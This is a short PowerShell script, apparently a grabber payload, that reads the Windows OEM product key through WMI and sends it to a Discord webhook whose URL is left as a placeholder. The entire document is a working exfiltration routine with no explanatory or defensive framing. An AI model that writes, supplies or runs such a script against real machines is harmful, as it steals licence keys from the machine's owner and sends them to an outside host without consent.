$Key = (Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey
$WebhookURL = "YOUR_DISCORD_WEBHOOK_URL"

$Body = @{
    'content' = $Key
}

Invoke-RestMethod -Uri $WebhookURL -Method Post -Body ($Body | ConvertTo-Json)
